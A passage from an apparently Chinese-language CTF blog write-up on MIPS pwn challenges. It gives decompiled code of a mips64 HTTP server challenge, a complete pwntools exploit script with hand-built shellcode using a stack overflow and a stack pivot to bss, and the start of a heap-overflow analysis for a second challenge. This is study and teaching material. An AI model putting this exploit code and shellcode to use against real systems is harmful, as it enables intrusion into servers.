class="line">          iStack4200 = iVar1;</span><br><span class="line">        &#125;</span><br><span class="line">        __haystack = <span class="built_in">strstr</span>(__haystack_00,<span class="string">"\r\n\r\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> (__haystack != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          pcStack4208 = __haystack + <span class="number">4</span>;</span><br><span class="line">          sStack4280 = (sVar2 - ((<span class="keyword">int</span>)pcStack4208 - ((<span class="keyword">int</span>)register0x000000e8 + <span class="number">-0x1038</span>))) +</span><br><span class="line">                       iStack4200;</span><br><span class="line">          pcStack4272 = acStack4152 + sVar2;</span><br><span class="line">          <span class="keyword">while</span> ((sStack4280 != <span class="number">0</span> &amp;&amp; (sVar2 = read(<span class="number">0</span>,pcStack4272,sStack4280), <span class="number">0</span> &lt; sVar2))) &#123;</span><br><span class="line">            pcStack4272 = pcStack4272 + (<span class="keyword">int</span>)sStack4280;</span><br><span class="line">            sStack4280 = sStack4280 - sVar2;</span><br><span class="line">          &#125;</span><br><span class="line">          parse_req(auStack4240,auStack4192);</span><br><span class="line">          http_sendmsg(auStack4192);</span><br><span class="line">          <span class="built_in">free</span>(pvStack4160);</span><br><span class="line">          <span class="keyword">if</span> (iStack4164 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造出包的解析规则之后在return的时候劫持控制流，这里有一个问题是<code>iStack4164 == 0</code>条件如何成立，ghidra中调试发现<code>Connection:</code>字段为<code>keep-alive</code>的时候，会设置<code>uStack4216 = 1</code>，后面虽然也没找到对这个flag处理的东西，不过到最后<code>iStack4164</code>也会被设置为1，因此只要设置<code>Connection</code>为<code>no</code>即可退出循环，这点根据http包的字段含义也比较好理解。</p>
<p>最后溢出可控ra/fp/gp/sp寄存器的值，寻找gadget无果之后决定进行栈迁移，二次读取shellcode到bss上并跳转执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">120001c94 df bf 10 b8     ld         ra,0x10b8(sp)</span><br><span class="line">120001c98 df be 10 b0     ld         s8,0x10b0(sp)</span><br><span class="line">120001c9c df bc 10 a8     ld         gp,0x10a8(sp)</span><br><span class="line">120001ca0 67 bd 10 c0     daddiu     sp,sp,0x10c0</span><br><span class="line">120001ca4 03 e0 00 08     jr         ra</span><br></pre></td></tr></table></figure>
<p>由于fp可控，因此buf位置可控，我们将其控制到bss上。此外<code>gp</code>的值是各种函数寻址的一个依据，调试可以看到其为一个固定值<code>0x12001a250</code>，照抄即可。最后经过二次溢出，可以在bss上部署shellcode。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">67 C2 00 88             daddiu  $v0, $fp, 0x10C0+var_1038</span><br><span class="line">24 06 10 00             li      $a2, 0x1000      # nbytes</span><br><span class="line">00 40 28 25             move    $a1, $v0         # buf</span><br><span class="line">00 00 20 25             move    $a0, $zero       # fd</span><br><span class="line">DF 82 81 28             dla     $v0, read</span><br><span class="line">00 40 C8 25             move    $t9, $v0</span><br><span class="line">03 20 F8 09             jalr    $t9 ; read</span><br></pre></td></tr></table></figure>
<p>编写shellcode花了很久，主要原因是pwntools似乎没有mips的as，而我无论是拿mips64-linux-as还是buildroot自带的mips64-buildroot-as都只能编译出ELF32的。shell-storm有一个在线的<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">Online Assembler</a>，不过有一些指令也识别不出。<code>radare</code>的<code>rasm2</code>同理。</p>
<p>最后的最后我把uClibc的IDA汇编导出，寻找自己想写的汇编指令，再通过alt+t反查字节码，编写出了shellcode。</p>
<p>系统调用的规则和x86相似，这里在buildroot的lib/include里找到了<code>unistd_n64.h</code>(可以直接拿find命令),其中<code>__NR_Linux</code>宏的值为十进制<code>5000</code>。系统调用的参数寄存器为a0/a1/a2，返回值存储到v0。</p>
<p>另外libc中搜到的syscall都是<code>syscall 0</code>，实际中需要的是<code>syscall 0x40404</code>，即字节码p32(0x0101010c)。</p>
<p>可以看到最后解析的字节码中t6/t7呢被换成了t2/t3，还是有些差异，不过不影响使用。这里的sw不可换成sd。</p>
<p><img src="/2020/12/14/mips-pwn/9.png" alt></p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><p><img src="/2020/12/14/mips-pwn/10.png" alt></p>
<p>由于发送的payload数量过大，可能数据会有缺失或者粘连，发送间隔需要久一点，需要多试几次。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'mips64'</span>,endian=<span class="string">'big'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./lib/libc.so.0'</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mips64-static"</span>, <span class="string">"-L"</span>, <span class="string">"/home/wz/Desktop/CTF/RCTF/mnginx/player"</span>, <span class="string">"./mginx"</span>])</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mips64-static"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/home/wz/Desktop/CTF/RCTF/mnginx/player"</span>, <span class="string">"./mginx"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">3333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    payload = <span class="string">"POST /xmzyshypnc"</span></span><br><span class="line">    payload += <span class="string">"  \r\n"</span></span><br><span class="line">    payload += <span class="string">"Connection: no"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: "</span></span><br><span class="line">    payload += str(<span class="number">0xfff</span>)</span><br><span class="line">    payload += <span class="string">"\r\n\r\n"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    bss_addr = <span class="number">0x12001a250</span></span><br><span class="line">    read_addr = <span class="number">0x1200018c4</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0xf30</span></span><br><span class="line">    payload += p64(bss_addr)<span class="comment">#gp</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000120012000</span>+<span class="number">0x500</span><span class="number">-0x88</span>)<span class="comment">#fp</span></span><br><span class="line">    payload += p64(read_addr)<span class="comment">#$ra</span></span><br><span class="line">    payload += p64(<span class="number">0x12345678</span>)<span class="comment">#$sp</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x10ba</span>,<span class="string">'a'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = <span class="string">"POST /xmzyshypnc"</span></span><br><span class="line">    payload += <span class="string">"  \r\n"</span></span><br><span class="line">    payload += <span class="string">"Connection: no"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: "</span></span><br><span class="line">    payload += str(<span class="number">0xfff</span>)</span><br><span class="line">    payload += <span class="string">"\r\n\r\n"</span></span><br><span class="line">    <span class="comment">#payload = payload.ljust(0x40,'\x00')</span></span><br><span class="line">    <span class="comment">#payload += shellcode</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#sc = "\x3c\x0d\x2f\x66\x35\xad\x6c\x61\xaf\xad\xff\xf8\x3c\x0d\x67\x00\xaf\xad\xff\xfc\x67\xa4\xff\xf8\x34\x05\xff\xff\x00\xa0\x28\x2a\x34\x02\x13\x8a\x01\x01\x01\x0c"</span></span><br><span class="line">    <span class="comment">#sc += "\x00\x40\x20\x25\x24\x06\x01\x00\x67\xa5\xff\x00\x34\x02\x13\x88\x01\x01\x01\x0c"</span></span><br><span class="line">    <span class="comment">#sc += "\x24\x04\x00\x01\x34\x02\x13\x89\x01\x01\x01\x0c"</span></span><br><span class="line">    sc = <span class="string">"\x3c\x0e\x2f\x66"</span><span class="comment">#lui     $t6, 0x2f66</span></span><br><span class="line">    sc += <span class="string">"\x65\xCE\x6c\x61"</span><span class="comment">#daddiu  $t6, 0x6c61</span></span><br><span class="line">    sc += <span class="string">"\xaf\xae\x00\x20"</span><span class="comment">#sw      $t6, 0x20($sp)</span></span><br><span class="line">    sc += <span class="string">"\x3c\x0f\x67\x00"</span><span class="comment">#lui     $t7, 0x6700</span></span><br><span class="line">    sc += <span class="string">"\xaf\xaf\x00\x24"</span><span class="comment">#sw      $t7, 0x24($sp)</span></span><br><span class="line">    sc += <span class="string">"\x67\xA4\x00\x20"</span><span class="comment">#daddiu  $a0, $sp, 0x20</span></span><br><span class="line">    sc += <span class="string">"\x00\x00\x28\x25"</span><span class="comment">#move    $a1, $zero</span></span><br><span class="line">    sc += <span class="string">"\x00\x00\x30\x25"</span><span class="comment">#move    $a2, $zero</span></span><br><span class="line">    sc += <span class="string">"\x24\x02\x13\x8a"</span><span class="comment">#li      $v0, 5002</span></span><br><span class="line">    sc += <span class="string">"\x01\x01\x01\x0c"</span><span class="comment">#syscall 0"</span></span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    sc += <span class="string">"\x00\x40\x20\x25"</span><span class="comment">#move    $a0, $v0"</span></span><br><span class="line">    sc += <span class="string">"\x67\xA5\x00\x30"</span><span class="comment">#daddiu  $a1, $sp, 0x30</span></span><br><span class="line">    sc += <span class="string">"\x24\x06\x00\x80"</span><span class="comment">#li      $a2, 0x80</span></span><br><span class="line">    sc += <span class="string">"\x24\x02\x13\x88"</span><span class="comment">#li      $v0, 5000</span></span><br><span class="line">    sc += <span class="string">"\x01\x01\x01\x0c"</span><span class="comment">#syscall 0"</span></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    sc += <span class="string">"\x24\x04\x00\x01"</span><span class="comment">#li      $a0, 1</span></span><br><span class="line">    sc += <span class="string">"\x67\xA5\x00\x30"</span><span class="comment">#daddiu  $a1, $sp, 0x30</span></span><br><span class="line">    sc += <span class="string">"\x24\x06\x00\x80"</span><span class="comment">#li      $a2, 0x80</span></span><br><span class="line">    sc += <span class="string">"\x24\x02\x13\x89"</span><span class="comment">#li      $v0, 5001</span></span><br><span class="line">    sc += <span class="string">"\x01\x01\x01\x0c"</span><span class="comment">#syscall 0"</span></span><br><span class="line">    <span class="comment">#exit</span></span><br><span class="line">    sc += <span class="string">"\x00\x00\x20\x25"</span><span class="comment">#move    $a0, $zero"</span></span><br><span class="line">    sc += <span class="string">"\x24\x02\x13\xc2"</span><span class="comment">#li      $v0, 5001</span></span><br><span class="line">    sc += <span class="string">"\x01\x01\x01\x0c"</span><span class="comment">#syscall 0"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#shellcode = ""</span></span><br><span class="line">    <span class="comment">#for i in range(len(sc)/4):</span></span><br><span class="line">    <span class="comment">#    sc1 = sc[i*4:i*4+4]</span></span><br><span class="line">    <span class="comment">#    shellcode += sc1[::-1]</span></span><br><span class="line">    payload = sc</span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x21</span>)*((<span class="number">0xf30</span><span class="number">-0x100</span>)/<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#payload = 'a'*0xf30</span></span><br><span class="line">    payload += p64(bss_addr)<span class="comment">#gp</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000120012000</span>+<span class="number">0x500</span><span class="number">-0x88</span>)<span class="comment">#fp</span></span><br><span class="line">    payload += p64(<span class="number">0x00000001200125f0</span>)<span class="comment">#$ra</span></span><br><span class="line">    payload += p64(<span class="number">0x2333</span>)<span class="comment">#$sp</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x10ba</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="强网杯2020-MipsGame"><a href="#强网杯2020-MipsGame" class="headerlink" title="强网杯2020-MipsGame"></a>强网杯2020-MipsGame</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>首先安利一个插件<a href="https://github.com/enovella/ida2ghidra-kb" target="_blank" rel="noopener">ida2ghidra</a>，可以增加数据和代码高亮，进行重命名等IDA常用的操作，代码看起来会简单一点。</p>
<h3 id="程序逻辑-amp-amp-漏洞利用-1"><a href="#程序逻辑-amp-amp-漏洞利用-1" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>程序模拟了一个httpd，accept_request函数中接收类http请求，需要花一些时间理清合法的header结构，在<code>handle</code>函数中，会对请求做响应。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accept_request</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined4 extraout_v0_hi;</span><br><span class="line">  undefined4 extraout_v0_hi_00;</span><br><span class="line">  undefined4 extraout_v0_hi_01;</span><br><span class="line">  undefined4 extraout_v0_hi_02;</span><br><span class="line">  undefined4 extraout_v0_hi_03;</span><br><span class="line">  undefined4 extraout_v0_hi_04;</span><br><span class="line">  undefined4 extraout_v0_hi_05;</span><br><span class="line">  undefined4 extraout_v0_hi_06;</span><br><span class="line">  undefined4 extraout_v0_hi_07;</span><br><span class="line">  <span class="keyword">int</span> is_GET;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">size_t</span> sVar3;</span><br><span class="line">  <span class="keyword">size_t</span> sVar2;</span><br><span class="line">  ulonglong data_len;</span><br><span class="line">  ulonglong idx;</span><br><span class="line">  ulonglong idx1;</span><br><span class="line">  <span class="keyword">char</span> *idx_after_ask_token;</span><br><span class="line">  <span class="keyword">char</span> input_data [<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">char</span> first_filter_data [<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">char</span> second_filter_data [<span class="number">255</span>];</span><br><span class="line">  <span class="keyword">char</span> oncat_str [<span class="number">9</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack736 [<span class="number">504</span>];</span><br><span class="line">  stat asStack232 [<span class="number">2</span>];</span><br><span class="line">  undefined *local_18;</span><br><span class="line">  <span class="keyword">bool</span> find_ask_token;</span><br><span class="line">  </span><br><span class="line">  idx_after_ask_token = (<span class="keyword">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  data_len = get_line(input_data,<span class="number">0x400</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (((*(ushort *)(__ctype_b + (longlong)input_data[idx] * <span class="number">2</span>) &amp; <span class="number">0x20</span>) == <span class="number">0</span> &amp;&amp; (idx &lt; <span class="number">0xfe</span>))) &#123;</span><br><span class="line">    first_filter_data[idx] = input_data[idx];</span><br><span class="line">    idx = idx + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* strip space */</span></span><br><span class="line">  idx1 = idx;</span><br><span class="line">  first_filter_data[idx] = <span class="string">'\0'</span>;</span><br><span class="line">  is_GET = strcasecmp(first_filter_data,<span class="string">"GET"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((CONCAT44(extraout_v0_hi,is_GET) == <span class="number">0</span>) ||</span><br><span class="line">     (iVar1 = strcasecmp(first_filter_data,<span class="string">"POST"</span>), CONCAT44(extraout_v0_hi_00,iVar1) == <span class="number">0</span>)) &#123;</span><br><span class="line">    iVar1 = strcasecmp(first_filter_data,<span class="string">"POST"</span>);</span><br><span class="line">    find_ask_token = CONCAT44(extraout_v0_hi_01,iVar1) == <span class="number">0</span>;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (((*(ushort *)(__ctype_b + (longlong)input_data[idx1] * <span class="number">2</span>) &amp; <span class="number">0x20</span>) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">           (idx1 &lt; data_len))) &#123;</span><br><span class="line">                    <span class="comment">/* filter the space to copy  */</span></span><br><span class="line">      idx1 = idx1 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((((*(ushort *)(__ctype_b + (longlong)input_data[idx1] * <span class="number">2</span>) &amp; <span class="number">0x20</span>) == <span class="number">0</span> &amp;&amp; (idx &lt; <span class="number">0xfe</span>))</span><br><span class="line">           &amp;&amp; (idx1 &lt; data_len))) &#123;</span><br><span class="line">      second_filter_data[idx] = input_data[idx1];</span><br><span class="line">      idx = idx + <span class="number">1</span>;</span><br><span class="line">      idx1 = idx1 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    second_filter_data[idx] = <span class="string">'\0'</span>;</span><br><span class="line">    iVar1 = strcasecmp(first_filter_data,<span class="string">"GET"</span>);</span><br><span class="line">    <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_02,iVar1) == <span class="number">0</span>) &#123;</span><br><span class="line">      idx_after_ask_token = second_filter_data;</span><br><span class="line">      <span class="keyword">while</span> ((*idx_after_ask_token != <span class="string">'?'</span> &amp;&amp; (*idx_after_ask_token != <span class="string">'\0'</span>))) &#123;</span><br><span class="line">        idx_after_ask_token = idx_after_ask_token + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*idx_after_ask_token == <span class="string">'?'</span>) &#123;</span><br><span class="line">        find_ask_token = <span class="literal">true</span>;</span><br><span class="line">        *idx_after_ask_token = <span class="string">'\0'</span>;</span><br><span class="line">        idx_after_ask_token = idx_after_ask_token + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(oncat_str + <span class="number">1</span>,<span class="string">"htdocs%s"</span>,second_filter_data);</span><br><span class="line">    sVar3 = <span class="built_in">strlen</span>(oncat_str + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (oncat_str[CONCAT44(extraout_v0_hi_03,sVar3)] == <span class="string">'/'</span>) &#123;</span><br><span class="line">      sVar2 = <span class="built_in">strlen</span>(oncat_str + <span class="number">1</span>);</span><br><span class="line">      _extraout_v0_hi_04 = CONCAT44(extraout_v0_hi_04,sVar2);</span><br><span class="line">      *(undefined8 *)(oncat_str + _extraout_v0_hi_04 + <span class="number">1</span>) = <span class="number">0x696e6465782e6874</span>;</span><br><span class="line">      acStack736[_extraout_v0_hi_04] = <span class="string">'m'</span>;</span><br><span class="line">      acStack736[_extraout_v0_hi_04 + <span class="number">1</span>] = <span class="string">'l'</span>;</span><br><span class="line">      acStack736[_extraout_v0_hi_04 + <span class="number">2</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = stat(oncat_str + <span class="number">1</span>,asStack232);</span><br><span class="line">    <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_05,iVar1) == <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> ((data_len != <span class="number">0</span> &amp;&amp;</span><br><span class="line">             (iVar1 = <span class="built_in">strcmp</span>(<span class="string">"\n"</span>,input_data), CONCAT44(extraout_v0_hi_06,iVar1) != <span class="number">0</span>))) &#123;</span><br><span class="line">        data_len = get_line(input_data,<span class="number">0x400</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      not_found();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ((asStack232[<span class="number">0</span>].__pad0 &amp; <span class="number">0xf000</span>U) == <span class="number">0x4000</span>) &#123;</span><br><span class="line">        sVar2 = <span class="built_in">strlen</span>(oncat_str + <span class="number">1</span>);</span><br><span class="line">        _extraout_v0_hi_07 = CONCAT44(extraout_v0_hi_07,sVar2);</span><br><span class="line">        *(undefined8 *)(oncat_str + _extraout_v0_hi_07 + <span class="number">1</span>) = <span class="number">0x2f696e6465782e68</span>;</span><br><span class="line">        acStack736[_extraout_v0_hi_07] = <span class="string">'t'</span>;</span><br><span class="line">        acStack736[_extraout_v0_hi_07 + <span class="number">1</span>] = <span class="string">'m'</span>;</span><br><span class="line">        acStack736[_extraout_v0_hi_07 + <span class="number">2</span>] = <span class="string">'l'</span>;</span><br><span class="line">        acStack736[_extraout_v0_hi_07 + <span class="number">3</span>] = <span class="string">'\0'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (find_ask_token) &#123;</span><br><span class="line">        handle(oncat_str + <span class="number">1</span>,first_filter_data,idx_after_ask_token);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        serve_file(oncat_str + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    unimplemented();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>handle函数中有一些堆菜单题的基本操作，包括<code>Add/Show/Del</code>。首先关注的就是这里的数据输入是使用strcpy进行赋值，气氛上可以off-by-null，不过测试之后发现并不可以，于是找了下别的洞，发现error_request函数中可以拷贝至多0x400数据至info，而Info在init函数中是通过<code>malloc(0x200)</code>赋值的，因而存在堆溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">(EVP_PKEY_CTX *ctx)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x3c</span>);</span><br><span class="line">  tmp = <span class="built_in">malloc</span>(<span class="number">0x250</span>);</span><br><span class="line">  info = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1143b0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_request</span><span class="params">(<span class="keyword">void</span> *param_1,<span class="keyword">size_t</span> param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *__s;</span><br><span class="line">  <span class="keyword">size_t</span> __n;</span><br><span class="line">  </span><br><span class="line">  __s = info;</span><br><span class="line">  <span class="built_in">memset</span>(info,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"HTTP/1.0 400 ERROR REQUEST\r\n"</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"Server: QWBhttpd/1.1.0\r\n"</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"Content-Length: %d\r\n"</span>,param_2 + <span class="number">0x2f</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"Content-type: text/html\r\n"</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"\r\n"</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"&lt;P&gt;Your browser sent a error Content-Length: "</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="built_in">memcpy</span>(__s,param_1,param_2);</span><br><span class="line">  write(<span class="number">1</span>,__s,param_2);</span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"\r\n"</span>);</span><br><span class="line">  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,__n);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Could not reconcile some variable overlaps */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(undefined8 param_1,<span class="keyword">char</span> *param_2,<span class="keyword">char</span> *param_3)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> bVar1;</span><br><span class="line">  undefined4 extraout_v0_hi;</span><br><span class="line">  undefined4 extraout_v0_hi_00;</span><br><span class="line">  undefined4 extraout_v0_hi_01;</span><br><span class="line">  undefined4 extraout_v0_hi_02;</span><br><span class="line">  undefined4 extraout_v0_hi_03;</span><br><span class="line">  undefined4 extraout_v0_hi_04;</span><br><span class="line">  undefined4 extraout_v0_hi_05;</span><br><span class="line">  undefined4 extraout_v0_hi_06;</span><br><span class="line">  undefined4 extraout_v0_hi_07;</span><br><span class="line">  <span class="keyword">int</span> idx;</span><br><span class="line">  <span class="keyword">char</span> *pcVar2;</span><br><span class="line">  <span class="keyword">size_t</span> __n;</span><br><span class="line">  <span class="keyword">int</span> iVar3;</span><br><span class="line">  <span class="keyword">void</span> *__buf;</span><br><span class="line">  uint uStack1152;</span><br><span class="line">  uint uStack1148;</span><br><span class="line">  <span class="keyword">int</span> post_data;</span><br><span class="line">  <span class="keyword">size_t</span> new_sz;</span><br><span class="line">  <span class="keyword">int</span> iStack1136;</span><br><span class="line">  undefined8 input_data;</span><br><span class="line">  ulonglong uStack1112;</span><br><span class="line">  ulonglong sz_buf;</span><br><span class="line">  <span class="keyword">char</span> cStack1096;</span><br><span class="line">  <span class="keyword">char</span> acStack96 [<span class="number">16</span>];</span><br><span class="line">  <span class="keyword">char</span> idx_buf [<span class="number">16</span>];</span><br><span class="line">  undefined8 arg1;</span><br><span class="line">  <span class="keyword">char</span> *arg2;</span><br><span class="line">  <span class="keyword">char</span> *arg3;</span><br><span class="line">  undefined *local_18;</span><br><span class="line">  </span><br><span class="line">  local_18 = &amp;_gp_1;</span><br><span class="line">  post_data = <span class="number">1</span>;</span><br><span class="line">  new_sz = <span class="number">0xffffffff</span>;</span><br><span class="line">  iStack1136 = <span class="number">-1</span>;</span><br><span class="line">  input_data._1_7_ = input_data._1_7_ &amp; <span class="number">0xffffffffffff</span>;</span><br><span class="line">  input_data = CONCAT17(<span class="number">0x41</span>,input_data._1_7_);</span><br><span class="line">  arg1 = param_1;</span><br><span class="line">  arg2 = param_2;</span><br><span class="line">  arg3 = param_3;</span><br><span class="line">  idx = strcasecmp(param_2,<span class="string">"GET"</span>);</span><br><span class="line">  <span class="keyword">if</span> (CONCAT44(extraout_v0_hi,idx) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="number">0</span> &lt; post_data &amp;&amp;</span><br><span class="line">           (idx = <span class="built_in">strcmp</span>(<span class="string">"\n"</span>,(<span class="keyword">char</span> *)&amp;input_data), CONCAT44(extraout_v0_hi_00,idx) != <span class="number">0</span>))) &#123;</span><br><span class="line">      post_data = get_line(&amp;input_data,<span class="number">0x400</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar2 = <span class="built_in">strchr</span>(arg3,<span class="number">0x3d</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar2 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      bad_request();</span><br><span class="line">    &#125;</span><br><span class="line">    